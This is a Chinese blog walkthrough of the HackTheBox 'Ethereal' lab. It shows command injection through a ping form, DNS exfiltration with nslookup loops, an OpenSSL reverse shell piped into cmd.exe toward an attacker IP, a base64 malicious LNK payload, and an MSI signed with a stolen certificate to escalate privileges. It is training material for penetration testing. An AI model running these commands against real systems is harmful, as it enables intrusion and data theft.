> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yueCXVovnM8ML13wZyrpQg)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **80** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/zYxEsibHhhqHFXvQKic55dUSltLhKZhWS26N6nZiaz7TZhriaodk3GvvC5cnnSRwZR5f8TztGuKSBM7d2JMSl5iafcw/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/157

靶机难度：疯狂难度（6.5/10）

靶机发布日期：2019 年 2 月 30 日

靶机描述：

Ethereal is an "insane" difficulty machine, which showcases how DNS can be used to exfiltrate information from a system, and is applicable to many externally facing applications. It also features a very restrictive environment, which is made more hospitable by the use of the OpenSSL "LOLBIN". It highlights how malicious shortcut files can be used to move laterally and vertically within a system or network. Finally, it shows how an attacker would be able use trusted certificates to defeat a stringent application whitelisting configuration. Finally, it showcases techniques for creating and signing Windows Installer (MSI) files.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_gif/IwSh4vCvtCmAiahWWBCD6uVshNlbtsZxyBFdtQH49ia9feSkCyicQ3mgkNnn0DJR5ZYicTLj7IYQquYbqzXp3Y5HQA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/XxrR38Omj5OU35wZiblPezbUu0aFe8g7adFDiar2por60icw9uh1XSFlykibc3jzCByDbG1hhhxNEk13P15Ofiam6Mg/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_gif/z0LeJkZyUa7niaILpQLyj2SXVMFWPGRlKJVgNJ6OUubgicSlhy5yoOrKmqJ2dcAicOTFYG7FUAxFCCbYwz70WcaoQ/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2okvxI2SJZqUhIiaeIWazSJC0525Bvib3YdlG9Z1R1dZFxamTftNZxOV6A/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.106....

Nmap 可以看到 FTP 可匿名登陆，80 和 8080 的 IIS 服务器都开放着... 端口 80 显示了下面的登录页面以及目录...

先查看 Ftp... 一步一步来...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oBeFibPC0LKSNoxpknKbgHYQ6icMjaYMGtvql0xDPMHGoBhE2LC5hBtCw/640?wx_fmt=png)

可以看到有很多信息... 全部下载到 kali 查看..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2orTJkbKpg7wxup4biaicZMXdbfia9icBnwp8EPCpIJI2LCiaNvIKWeHxL30A/640?wx_fmt=png)

```
wget -r --no-passive ftp://10.10.10.106
```

全部下载完...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2o37qKATv51TYLUqkcILyibiagNSicZLGf2l1iaKJcDymfKVTAzAGQ7JicCag/640?wx_fmt=png)

解压 FDISK.zip 和 DISK1.zip 文件... 发现都是 FAT 系统磁盘文件... 这里可以进行挂载查看下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oQeN5NSdjbjL7KLhH1ZmPozdXaVCNbBfpdpxxVxCpxXuYQgbS0LR32Q/640?wx_fmt=png)

可以看到，成功挂载后，查看了三个系统内容，fdisk 里面的信息可能有用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2ogSSgsIyjmImt1z1SovXth5INicerMyu4vN4NPA7zFMTNEibMwmIo0Aww/640?wx_fmt=png)

可以看到这需要 MS-DOS 打开它..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2ovPEEqzJbyPSjNYyzfEMjtEtzlokAs6j6QRibuTsUsBUJDyaYiaRkGXMA/640?wx_fmt=png)

```
https://sourceforge.net/projects/passwbox/postdownload
```

下载即可...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2o7CmowaSWib4WiasRibXgScFL4m0oy1Q5DMD79ibFVxKdfJWl5F6J5Mohtg/640?wx_fmt=png)

```
apt install libncurses5
apt install libncurses5:i386
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2o9ILE11LzygxE1pzN6RuDCObxDMn7tkBuxNGZdY8yJvRtl3AX3yTxmg/640?wx_fmt=png)

成功安装... 可以看到只需要把文件复制到 / root/.pbox.dat 打开即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2ooZxMqTrpquvJpyg9xLvkr927D2ADMqShtoiaOPEpS747SPKa3m0hghQ/640?wx_fmt=png)

输入密码：

```
password
```

很简单的默认密码...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oFXicxRKKOvYho2xmC970YxEdz95YbdQxicUosficANl2XgDlGibDhmvhXw/640?wx_fmt=png)

成功进来后...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oOsNeu9Cu9znT9Izysg81c0Eribh6smjvSwc2orm90y0SED2XwKFEOjA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oBBRrAAYfaSR7qZW5Jy47tDWbTjc2DhO6vss7N0X1U003TsQM08T4Xw/640?wx_fmt=png)

可以看到，进来后找到很多密码... 记录下来... 继续走下一步，80 和 8080 页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oH8vDW6DlR5M2PA7Sa7RCVVrxLibaMMtz0mPfsy6OSpanT5m3CSIQbRw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2om1RXX0IcPHMgJzibAn9RrhoV43YMgbsiaJxwESDwuHI8IKPIA7wrfbrw/640?wx_fmt=png)

到这个界面后，一个一个点下去....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2o5j3ibKXzKNmqLyERhGn0rwVNqrtBdqjOgwJMRRmcDG1JlCED20qwBug/640?wx_fmt=png)

这里发现了用户名：alan

发现 ping 页面需要添加域名操作...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2o0TgwRiaFVSge6zib44I7baxkvxTzr1koTJPAELSwn2B7j3x0u2W4Zorw/640?wx_fmt=png)

添加完后访问需要登陆用户密码... 密码前面已经 pbox 查看到了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2o1jcMDiaEk3iaqOh330QjoziahgianZdF6cotP0HHlgzZHicFqGic0XYzhTOQ/640?wx_fmt=png)

这里密码是:

```
!C414m17y57r1k3s4g41n!
```

成功登陆... 这里可以注入攻击... 先用 ping 测试下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oohtOeXeREMqIh3SvQl18mHlIehV1oIibRMSLDvXsu4nBRpXjHYbou5w/640?wx_fmt=png)

输入本地 IP 进行 ping 测试即可.. 发现 icmp 回包了... 可以注入

这里尝试绕过该命令并使用 & 或注入系统命令 |... 但是没效果...

直接在里面利用 certutil 下载 nc 提权也没用...

这里利用 responder 进行 ：当网络上的设备尝试用 LLMNR 和 NBT-NS 请求来解析目的地机器时，Responder 就会伪装成目的地机器。当受害者机器尝试登陆攻击者机器，responder 就可以获取受害者机器用户的 NTLMv2 哈希值... 走起

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2og8h01abkFQyWEAYkpyjDibbwvcVicW6sHafl3h9gGG3LuCmNl44WzBjQ/640?wx_fmt=png)

```
responder -I tun0
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oECb23YAWPy4E8ubZiaSEROOGpXPm74f2R4B1RMkm4YL56UO5C7EBtNQ/640?wx_fmt=png)

```
10.10.14.11 & for /F "tokens=1" %i in ('whoami') do nslookup %i 10.10.14.11
```

终于成功了... 看到了 etherealalan...

https://ss64.com/nt/for_f.html 这是一个库，可以参考里面的命令进行查询注入即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2ob1pTStb660nNSLZBwGXM1G4dwPiatSGPQjGA0lNdjWCX2Jdrvkfbq8Q/640?wx_fmt=png)

可以看到目前的目录是 c:\windows\system32\inetsrv...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oQY7gQ76e6R3rENfLJWGrfRfJSYYJHPGzlHRcq1ia9hBlOekZVHI0zeQ/640?wx_fmt=png)

```
10.10.14.11 & for /F "tokens=1,2,3" %a in ('dir /B "C:\Users"') do nslookup %a.%b%c 10.10.14.11
```

可以看到这里有五个用户存在... 继续收集信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oZRJp27kDL6Satt4J1NCZ0eLpLVy1gywZHTuuqpgibia7zRWaRPqVfYKg/640?wx_fmt=png)

注意到已经安装了 OpenSSL.. 这里检查下防火墙状态，因为前面试过提权上传不上去... 估计是杀死了

```
| netsh advfirewall firewall show rule name=all | findstr "Rule Name:" | findstr "Allow" > C:\Users\Public\Desktop\Shortcuts\dayufirewall.txt
```

这里把防火墙规则的信息放入了 dayufirewall.txt... 这里查看是否存在该文件...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oLVGPmvV17PY4Gs5rmRQBiaAQc5wttgBYvZkEBWcg7d9iaVyBWVzd5xOg/640?wx_fmt=png)

```
10.10.14.11 & for /F "tokens=1,2,3" %a in ('dir /B "C:\Users\Public\Desktop\Shortcuts"') do nslookup %a.%b.%c 10.10.14.11
```

这里在目录下看到已经存在了... 这里需要看看防火墙规则是怎么样了... 好找到一个可以突破点... 读取该文件..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2o9qLadQO0eQ2v4dXfHWCwJa5ic7j5hqupmsFnfQEo7lJBnlKfy53TPPw/640?wx_fmt=png)

```
10.10.14.11 & for /F "tokens=1,2,3,4,5,6,7" %a in ('type C:\Users\Public\Desktop\Shortcuts\dayufirewall.txt') do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.14.11
```

可以看到仅允许 TCP 连接到 port 73 和 136 上... 因为 windows 上安装了 openssl，这里就利用 openssl 进行提权...

这里利用

```
[SSL/TLS server](https://www.openssl.org/docs/man1.0.2/man1/openssl-s_server.html)
```

这里先确定下 openssl.exe 的位置..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2ospIG5PagbwhvWGAnmsAwjpfkLujACr23XXltRl9rZicKibo10pfGHLFw/640?wx_fmt=png)

```
10.10.14.11 & for /F "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)\OpenSSL-v1.1.0"') do nslookup %a.%b.%c 10.10.14.11
```

可以看到位置位于 C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe...

开始...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oXRH7nuSLYLexjTTWp2gt7jPzm1fBbpzC6RpXH5oaRT0jcibRV0dveQQ/640?wx_fmt=png)

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodes
```

为了创建服务器，这里利用 openssl 生成了证书...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oggW2juKVPcLb09UJLYsSicOEN9V0Ds9jvXibyX0uoEicJ6arsiapo7xGMw/640?wx_fmt=png)

```
openssl s_server -quiet -key key.pem -cert cert.pem -port 73
| C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.11:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.11:73
```

可以看到利用 openssl 通过 73 端口进入了服务器中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2o19UNVBslSbyaYVU7xIC07udAG5X2gcBcdUGFQwwfkd5vSBExtrtDyg/640?wx_fmt=png)

这里遇到了点问题，无法寻找到数据包... 输入任何都没反应...

我就把命令通过 PING 通道注入，发现需要指定 IP，一进一出才能正常读取数据...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2okWIRku04za87pryE9AmIlWc1MJHJGoy1bPSaOvx9hgGpvPJibdqhBzQ/640?wx_fmt=png)

可以了，现在数据包正常一进一出了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oiarP2iaO6x1fiaaMPjHCrMB2jOvxStxOd5BtpfJ239ibze96aGawtEWZ0w/640?wx_fmt=png)

```
127.0.0.1 | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.11:73 | dir C:\users\alan\Desktop | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.11:136
```

这里查询 alan 桌面存在个文件... 查询看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2opibrAqqWK6MH5xqMicrfpf2MdwmIXic7PXh3mwPM7cTRKHLn1nXphyiaoA/640?wx_fmt=png)

```
type C:\users\alan\Desktop\note-draft.txt
```

说 Public 的桌面上有很多东西，盒子上的其他用户正在使用它，可以删除和写入.. 去看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oFRYGTMcDsWibfZwl0d0j0HNF0DrbibKaSbsHBYH95A4L6vx9szZfHOcA/640?wx_fmt=png)

```
dir C:\users\Public\Desktop\Shortcuts
```

可以看到存在. lnk 文件.. 这里可以写入木马.. 提权试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oF7iakkoAhaw1Bhg02iblKUGSicnpC3ia5qADSzxVMr4HFPjGcml5bBQkgQ/640?wx_fmt=png)

这里利用 [LNKUp](https://github.com/Plazmaz/LNKUp)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oYeVF6F4ISO6VfksHib7MdBrV0ey5r14iaqjkRqwg2HOfQdEHY8eia8M0g/640?wx_fmt=png)

记得 pip install -r requirements.txt... 下载他的依赖文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oQ9ZmnRPausD9icctiaqqPATGwy4erLP79fib7oqeY5icCRaFOjCwYVibufg/640?wx_fmt=png)

```
python generate.py --host localhost --type ntlm --output out.lnk --execute "shutdown /s"
```

我这里还是使用了 python，因为 python3 的 pylnk.py 依赖报错...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2o4K9yOAT9J1jFmv0Hufy9NhkgPKgUpu5xtyicCoPORjRfx4zib4LQiaO9A/640?wx_fmt=png)

这里还是担心防火墙，就通过更保险方式 base64 值写入进去..

```
127.0.0.1 | echo | set /p="TAAAAAEUAgAAAAAAwAAAAAAAAEZhAAAAAAAAAIBMhoStAtYBgEyGhK0C1gGATIaErQLWAQAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAOcAFAAfUOBP0CDqOmkQotgIACswMJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAPAAxAAAAAAB5UHVPEABXaW5kb3dzACYAAwAEAO++eVB1T3lQdU8UAAAAVwBpAG4AZABvAHcAcwAAABYAQAAxAAAAAAB5UHVPEABTeXN0ZW0zMgAAKAADAAQA7755UHVPeVB1TxQAAABTAHkAcwB0AGUAbQAzADIAAAAYADwAMgAAKgQAeVB1TxAAY21kLmV4ZQAmAAMABADvvnlQdU95UHVPFAAAAGMAbQBkAC4AZQB4AGUAAAAWAAAAtQAvYyBDOlxQcm9ncmF+MlxPcGVuU1NMLXYxLjEuMFxiaW5cb3BlbnNzbC5leGUgc19jbGllbnQgLXF1aWV0IC1jb25uZWN0IDEwLjEwLjE0LjExOjczIHwgY21kLmV4ZSB8IEM6XFByb2dyYX4yXE9wZW5TU0wtdjEuMS4wXGJpblxvcGVuc3NsLmV4ZSBzX2NsaWVudCAtcXVpZXQgLWNvbm5lY3QgMTAuMTAuMTQuMTE6MTM2GgBcXGxvY2FsaG9zdFxTaGFyZVw1OTczLmljbwAAAAA=" > C:\users\Public\Desktop\Shortcuts\link.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oC2kricLDoGqrTaWcr0InPSkvHy2I99tDiczDcrGSu0BiahGiaqXbLlZhzg/640?wx_fmt=png)

可以看到，已经成功写入...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oVWly0GyLdfnpeDQAI8jQq3V6gI66gZXOYvD5T5HRJ4d04YP5r5WY6A/640?wx_fmt=png)

```
127.0.0.1 & C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -A -d -in "C:\users\Public\Desktop\Shortcuts\link.txt" -out "C:\users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk"
```

可以看到成功同步了... 这就不用那么麻烦了... 并且获得了 user 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oHDMmXyTOUliaPW1r1frahamuu0vsZkhX43xkteP8tlvej72227J0ZVQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oByiaIf1eBFnjguwD2iaPB32EGatcnFIwDRngjGNjos6YhVPpKBHGDJRA/640?wx_fmt=png)

```
fsutil fsinfo drives
```

这里还存在 D 盘,.. 进入 D 盘，查看到存在 note.txt 文件，看信息：

意思是创建一个恶意的 msi 文件并将它放进来进行提权，还需要获取证书以对 msi 进行签名... 这里要查找签名证书...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oPicj4tox82B3uESUGdQwHJvjicBpuwaD2uxYMClxCzxT4iajcZHtT9zog/640?wx_fmt=png)

在 certs 下查看到签名证书... 需要放到本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oP5cd1epzzM8p7NSDyW93N3SYHtbIwHed7YPHU3CQ2jZib104nQjp4Xw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2ocgOFGrFHq2zO0cXuBX0z5Ept60J1X54J93JAlrWOASdap9ibQkfn2gw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2ouxDkXsL0dB3b4Yp4AeroaeS1jCjmwGbia2D4t7RsZd4ibhia9qicT131HA/640?wx_fmt=png)

我利用 base64 读取出来，经过复制解码，然后转换成原先的证书...

这里要创建 msi 需要使用到 [wixtool](https://wixtoolset.org/) 进行构建即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oCceXFmGytnu8jgv6b1GgBNRHrNaPXGZAkWtW3uI8SGwiavsa3qc8jsg/640?wx_fmt=png)

```
https://blog.xpnsec.com/becoming-system/
```

利用这里的代码即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oqmanRwcqTsevNtmbbxcKXFl02lcbVca0s9R9IARxyqROd0QYibUg9mA/640?wx_fmt=png)

把这里代码换成简单的 cmd 提权即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oDx7WsL2LuQTib2d3TEiaJf1tPicwuXKVQRia8lx85B60GxHHYHgVlTM4oA/640?wx_fmt=png)

```
cmd.exe /c "C:\users\public\desktop\shortcuts\alha.lnk"
```

然后将 mv dayu.txt msi.xml 即可...

下载 WiX Toolset v3.11.2...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oibwj2CibT11hXTRsR0rNMYMzUnTuFEurMPWSkcS2wGkk8bUj2iah37crw/640?wx_fmt=png)

下载第一个即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2o3xzceJrKtd7iat3Wg2ic45t2CvHCibk9oBQGZGmCJA6GU840bEiaj08eHg/640?wx_fmt=png)

将 dayuxi 修改为 msi.xm... 然后打开 powershell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oPJEFibhbdNTbyrf94icqFabedKR3PdQV8hpqpz0lt6Gz3165ibYNqWTkA/640?wx_fmt=png)

删除行即可... 我这里重新在来了，目录太长，我在 C 盘下创建文件夹操作...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2ocKNTmJQ1fPicyPyiaiaibxY5oFjhub0dZa8ZMovmvJXTc3zIUUrRBFT33g/640?wx_fmt=png)

```
.\candle.exe C:\Ethereal\msi.xml -out C:\Ethereal\wixobj
.\light.exe C:\Ethereal\wixobj -out C:\Ethereal\alha.msi
```

这里使用 wix3112rtm 下载文件里的 candle.exe 对 wixtools 创建 wixobject 文件，然后将从 wixobject 中继续创建 msi 文件...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oJIgUbIlpZELjlecAXua9jtBNOggkCAcmtibHFCd3PA8FMPjxia7ic0icnA/640?wx_fmt=png)

这里许需要下载 windows 10 SDK 或者 windwos 10 KIts 中的工具来对靶机的 msi 进行签名，首先将使用 makecert.exe 从中获得的原始证书创建新证书即可... 下载地址：

```
https://developer.microsoft.com/en-US/windows/downloads/windows-10-sdk/
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oa1r0xJkRgHBNt6CtbRJh0JcJAHsBvty3SicxO1gu0crY3YJkow6fRcQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2o3JXibSIFELJ6rFdJ9ia8XuKJaaNd4ImxQJsXRDUBSDeCHVGAg9yu5gDA/640?wx_fmt=png)

```
.\makecert.exe -n "CN=Ethereal" -pe -cy end -ic C:\Ethereal\MyCA.cer -iv C:\Ethereal\MyCA.pvk -sky signature -sv C:\Ethereal\alha.pvk C:\Ethereal\alha.cer
```

这里要求输入密码，我将其保留为空白，不提供密码保护，后面签名就能无密码登陆...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oo4Xkcwdx9fib5VWY7Spq6l4qSo2GhbEwaWUBKZYp8IAhkjZtdgXsurg/640?wx_fmt=png)

```
.\pvk2pfx.exe -pvk C:\Ethereal\alha.pvk -spc C:\Ethereal\alha.cer -pfx C:\Ethereal\alha.pfx
.\signtool.exe sign /f C:\Ethereal\alha.pfx C:\Ethereal\alha.msi
```

用 pvk2pfx.exe 为 cer 和 pvk 文件创建 pfx...

最后将使用 signtool.exepfx 对 msi 进行签名即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oAEqQQj28mNQdeksia5kqAj3sydeiawLHZ8DfPLXVmWg3rGA2PwfEVPog/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2okt9Tx2JdwLnRQDEAiaGgKLGEOlM1EWx8HNcPrJwAQxeAZxUj9uuTgUQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2olNKib3ibUfvt6ibJ5DI4hVOPfIuCHxXGkyfojLQnYE3eBouFiaic5lyYXLw/640?wx_fmt=png)

```
127.0.0.1 | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.14.2:136 > "C:\Users\Public\Desktop\Shortcuts\alha.msi"
```

将与之前上传 lnk 文件相同的方式上传 msi 即可，并且还需要确保 lnk 文件在 c:\users\public\desktop\shortcuts \ 内，因为 msi 只是在执行该 lnk 文件... 最后将把 msi 放入到 D:\DEV\MSIs 内即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2ofzkF6RcOiaib3QqAmdegBjichmT4Mic8FDMZt4PIXSZzdpFmdRnf6piaA4A/640?wx_fmt=png)

```
127.0.0.1 & C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -A -d -in "C:\users\Public\Desktop\Shortcuts\link.txt" -out "C:\users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk"
```

重新在获得一次即可... 这里等待了 6 分钟左右才出现的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KO7U9D7AHVyxOy61hAnfB2oUlgkfUEU1FmORmQt1jEXkjicrpql95ZKtAdaEbugVL51MU9rGWicoTQQ/640?wx_fmt=png)

可以看到成功获得 root 信息... 太难了！！！！

这是我做的最难的一次了...

![](https://mmbiz.qpic.cn/mmbiz_png/zYxEsibHhhqHFXvQKic55dUSltLhKZhWS26N6nZiaz7TZhriaodk3GvvC5cnnSRwZR5f8TztGuKSBM7d2JMSl5iafcw/640?wx_fmt=png)

正如作者说的一样，这是一台疯狂的靶机...

它展示了如何使用 DNS 来从系统中窃取信息，并且适用于许多面向外部的应用程序，它还具有非常严格的环境，通过使用 OpenSSL LOLBIN 使它变得更加难... 它重点介绍了如何使用恶意快捷方式文件在系统或网络中横向和纵向移动，而且它显示了攻击者如何能够使用受信任的证书来破坏严格的应用程序白名单配置.... 最后它展示了用于创建和签名 Windows Installer（MSI）文件的技术...

这台靶机是我新工作出差第一次过夜，在机房里完成的... 坚持加油把！！！

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成这台疯狂的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_gif/IwSh4vCvtCmAiahWWBCD6uVshNlbtsZxyBFdtQH49ia9feSkCyicQ3mgkNnn0DJR5ZYicTLj7IYQquYbqzXp3Y5HQA/640?wx_fmt=gif)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)